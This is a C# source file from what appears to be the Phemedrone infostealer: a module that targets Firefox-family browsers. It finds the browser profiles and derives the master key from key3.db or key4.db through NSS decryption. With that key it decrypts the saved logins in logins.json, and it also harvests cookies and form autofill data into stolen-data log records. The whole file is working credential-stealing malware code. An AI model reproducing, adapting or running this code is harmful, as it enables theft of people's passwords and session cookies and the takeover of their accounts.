using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using Phemedrone.Classes;
using Phemedrone.Cryptography;
using Phemedrone.Cryptography.Hashing;
using Phemedrone.Extensions;
using Phemedrone.Services.Browsers;

namespace Phemedrone.Services
{
    public class Gecko : IService, IBrowser
    {
        public override PriorityLevel Priority => PriorityLevel.High;

        // as here code does not really differs from chromium one
        // i will merge it into another class soon to reduce file size
        protected override LogRecord[] Collect()
        {
            var array = new List<LogRecord>();
            foreach (var root in new List<string>
                     {
                         //Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                         Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
                     })
            {
                foreach (var browserFolder in BrowserHelpers.ListBrowsers(root, (directory) =>
                         {
                             if (!Directory.Exists(Path.Combine(directory, "Profiles"))) return false;
                             return Directory.GetFiles(directory, "*.ini").Length > 0;
                         }))
                {
                    var browserName = GetBrowserName(null, browserFolder);
                    var browserRoot = Path.Combine(browserFolder, "Profiles");
                    foreach (var profileLocation in ListProfiles(browserRoot))
                    {
                        var profileName = profileLocation.Split('\\').Last();
                        
                        byte[] masterKey = null;
                        switch (profileLocation)
                        {
                            case string a when File.Exists(Path.Combine(a, "key3.db")):
                                masterKey = Key3Database(Path.Combine(a, "key3.db"));
                                break;
                            case string a when File.Exists(Path.Combine(a, "key4.db")):
                                masterKey = Key4Database(Path.Combine(a, "key4.db"));
                                break;
                        }

                        if (masterKey != null) ServiceCounter.PasswordList.AddRange(
                            ParsePasswords(profileLocation, masterKey, browserName, profileName));
                        
                        var cookies = BrowserHelpers.ParseDatabase(
                            Path.Combine(profileLocation, "cookies.sqlite"),
                            "moz_cookies",
                            row =>
                            {
                                var hostname = Encoding.UTF8.GetString((byte[])row(4));
                                var httpOnly = ((ulong)row(10) == 1).ToString().ToUpper();
                                var path = Encoding.UTF8.GetString((byte[])row(5));
                                var secure = ((ulong)row(9) == 1).ToString().ToUpper();
                                var expires = (ulong)row(6);
                                var name = Encoding.UTF8.GetString((byte[])row(2));
                                var value = Encoding.UTF8.GetString((byte[])row(3));
                                BrowserHelpers.CookiesTags(hostname);
                                return BrowserHelpers.FormatCookie(hostname, httpOnly, path, secure, (long)expires, name, value);
                            });
                        
                        var autoFills = BrowserHelpers.ParseDatabase(
                            Path.Combine(profileLocation, "formhistory.sqlite"),
                            "moz_formhistory",
                            row =>
                            {
                                var name = Encoding.UTF8.GetString((byte[])row(1));
                                var value = Encoding.UTF8.GetString((byte[])row(2));
                                return BrowserHelpers.FormatAutofill(name, value);
                            });
                        
                        if (cookies.Count > 0)
                            array.Add(new LogRecord
                            {
                                Path = $"Browser Data/Cookies_{browserName}[{profileName}].txt",
                                Content = Encoding.UTF8.GetBytes(string.Join("\r\n", cookies))
                            });
                        
                        if (autoFills.Count > 0)
                            array.Add(new LogRecord
                            {
                                Path = $"Browser Data/AutoFills_{browserName}[{profileName}].txt",
                                Content = Encoding.UTF8.GetBytes(string.Join("\r\n\r\n", autoFills))
                            });
                    }
                }
            }
            
            return array.ToArray();
        }

        private static List<string> ParsePasswords(string profileLocation, byte[] key, string browserName, string profileName)
        {
            var array = new List<string>();
            string file;
            switch (profileLocation)
            {
                case string a when File.Exists(Path.Combine(a, "logins.json")):
                    file = Path.Combine(a, "logins.json");
                    break;
                default:
                    file = string.Empty;
                    break;
            }

            var loginsContent = NullableValue.Call(() => File.ReadAllText(file));
            if (loginsContent == null) return null;

            var jsonParser = new JsonParser();
            var asn = new Asn1Der();
            
            // we're not using json decoders so we're parsing json
            // using our JsonParser with last offset until next value is null
            while (true)
            {
                var credentialValues = new[]
                {
                    "encryptedUsername",
                    "encryptedPassword"
                };
                
                var hostName = jsonParser.ParseString("hostname", loginsContent, true);
                if (hostName == string.Empty) break;

                var list = new List<string>();
                foreach (var credentialValue in credentialValues)
                {
                    var credential = jsonParser.ParseString(credentialValue, loginsContent, true);
                    if (credential.Length < 1) break;
                    var asnCredential = asn.Parse(Convert.FromBase64String(credential));
                    var rawCredential = TripleDes.DecryptStringDesCbc(key, asnCredential.Objects[0].Objects[1].Objects[1].Data, asnCredential.Objects[0].Objects[2].Data);
                    list.Add(
                        rawCredential != null ? Regex.Replace(rawCredential, "[^\u0020-\u007F]", "") : string.Empty);
                }

                var credentials =
                    list.ToArray();
                BrowserHelpers.PasswordsTags(hostName);
                array.Add(BrowserHelpers.FormatPassword(hostName, credentials[0], credentials[1],
                    browserName, "1", profileName));
            }

            return array;
        }

        private static byte[] Key4Database(string path)
        {
            var asn = new Asn1Der();
            var reader = SQLiteReader.Create(path);
            if (reader == null) return null;
            if (!reader.ReadTable("metaData")) return null;
            for (var i = 0; i < reader.GetRowCount(); i++)
            {
                if (Encoding.UTF8.GetString((byte[])reader.GetValue(i, 0)) != "password") continue;
                var globalSalt = (byte[])reader.GetValue(i, 1);
                var asnBytes = (byte[])reader.GetValue(i, 2);
                if (globalSalt.Length < 1 || asnBytes.Length < 1) continue;
                var item2 = asn.Parse(asnBytes);
                var asnStr = item2.ToString();
                switch (asnStr)
                {
                    case string a when a.Contains("2A864886F70D010C050103"):
                    {
                        var entrySalt = item2.Objects[0]?.Objects[0]?.Objects[1]?.Objects[0]?.Data;
                        var cipherText = item2.Objects[0]?.Objects[1]?.Data;
                        if (entrySalt == null || cipherText == null) continue;
                        var passCheck = new TripleDes(cipherText, globalSalt, new byte[0], entrySalt);
                        var passwordCheck = passCheck.Compute();
                        var decryptedPassCheck = Encoding.GetEncoding("ISO-8859-1").GetString(passwordCheck);
                        if (!decryptedPassCheck.StartsWith("password-check")) continue;
                        break;
                    }
                    case string a when a.Contains("2A864886F70D01050D"):
                    {
                        var entrySalt = item2.Objects[0]?.Objects[0]?.Objects[1]?.Objects[0]?.Objects[1]?.Objects[0]?.Data;
                        var partVector = item2.Objects[0]?.Objects[0]?.Objects[1]?.Objects[2]?.Objects[1]?.Data;
                        var cipherText = item2.Objects[0]?.Objects[0]?.Objects[1]?.Objects[3]?.Data;
                        if (entrySalt == null || partVector == null || cipherText == null) continue;
                        var passCheck = new PBE(cipherText, globalSalt,
                            new byte[0], entrySalt, partVector);
                        var passwordCheck = passCheck.Compute();
                        var decryptedPassCheck = Encoding.GetEncoding("ISO-8859-1").GetString(passwordCheck);
                        if (!decryptedPassCheck.StartsWith("password-check")) continue;
                        break;
                    }
                    default: continue;
                }

                reader = SQLiteReader.Create(path);
                if (reader == null) continue;
                if (!reader.ReadTable("nssPrivate")) continue;
                
                for (var j = 0; j < reader.GetRowCount();)
                {
                    var a11Byte = (byte[])reader.GetValue(j, 6);
                    var a11Object = asn.Parse(a11Byte);
                    var keyEntrySalt = a11Object.Objects[0].Objects[0].Objects[1].Objects[0].Objects[1]
                        .Objects[0].Data;
                    var keyPartVector = a11Object.Objects[0].Objects[0].Objects[1].Objects[2].Objects[1].Data;
                    var keyCipherText = a11Object.Objects[0].Objects[0].Objects[1].Objects[3].Data;
                    var privateKeyHasher = new PBE(keyCipherText, globalSalt,
                        new byte[0], keyEntrySalt, keyPartVector);
                    var fullPrivateKey = privateKeyHasher.Compute();
                    var privateKey = new byte[24];
                    Array.Copy(fullPrivateKey, privateKey, privateKey.Length);
                    return privateKey;
                }
            }

            return null;
        }

        private static byte[] Key3Database(string path)
        {
            var fileContent = NullableValue.Call(() => File.ReadAllBytes(path));
            if (fileContent == null) return null;
            var asn = new Asn1Der();
            var database = new BerkeleyDB(fileContent);
            var toParse = (from p in database.Keys
                where p.Key.Equals("password-check")
                select p.Value).FirstOrDefault();
            if (toParse == null) return null;
            toParse = toParse.Replace("-", null);
            var entrySaltLength = int.Parse(toParse.Substring(2, 2), NumberStyles.HexNumber) * 2;
            var entrySalt = toParse.Substring(6, entrySaltLength);
            var oIdLength = toParse.Length - (6 + entrySaltLength + 36);
            var passCheck = toParse.Substring(6 + entrySaltLength + 4 + oIdLength);
            var globalSalt = (from p in database.Keys
                where p.Key.Equals("global-salt")
                select p.Value).FirstOrDefault();
            if (globalSalt == null) return null;
            globalSalt = globalSalt.Replace("-", null);
            var mCheck = new TripleDes(Helpers.HexToBytes(globalSalt), Encoding.ASCII.GetBytes(""),
                Helpers.HexToBytes(entrySalt));
            mCheck.ComputeVoid();
            var passCheckStr = TripleDes.DecryptStringDesCbc(mCheck.Key, mCheck.Vector, Helpers.HexToBytes(passCheck));
            if (!passCheckStr.StartsWith("password-check"))
            {
                return null;
            }

            var f81 = database.Keys
                .Where(p => !p.Key.Equals("global-salt") && !p.Key.Equals("Version") && !p.Key.Equals("password-check"))
                .Select(p => p.Value).FirstOrDefault();
            if (f81 == null) return null;
            f81 = f81.Replace("-", "");
            var f800001 = asn.Parse(Helpers.HexToBytes(f81));
            var privateKeyCheck = new TripleDes(Helpers.HexToBytes(globalSalt), Encoding.ASCII.GetBytes(""),
                f800001.Objects[0].Objects[0].Objects[1].Objects[0].Data);
            privateKeyCheck.ComputeVoid();
            var decryptF800001 = TripleDes.DecryptByteDesCbc(privateKeyCheck.Key, privateKeyCheck.Vector,
                f800001.Objects[0].Objects[1].Data);
            var f800001derivation1 = asn.Parse(decryptF800001);
            var f800001derivation2 = asn.Parse(f800001derivation1.Objects[0].Objects[2].Data);
            var privateKey = new byte[24];
            if (f800001derivation2.Objects[0].Objects[3].Data.Length > 24)
            {
                Array.Copy(f800001derivation2.Objects[0].Objects[3].Data,
                    f800001derivation2.Objects[0].Objects[3].Data.Length - 24, privateKey, 0, 24);
            }
            else
            {
                privateKey = f800001derivation2.Objects[0].Objects[3].Data;
            }

            return privateKey;
        }

        public string GetBrowserName(string root, string location)
        {
            return location.Split('\\').Last();
        }

        public List<string> ListProfiles(string rootLocation)
        {
            return Directory.GetDirectories(rootLocation).ToList();
        }
    }
}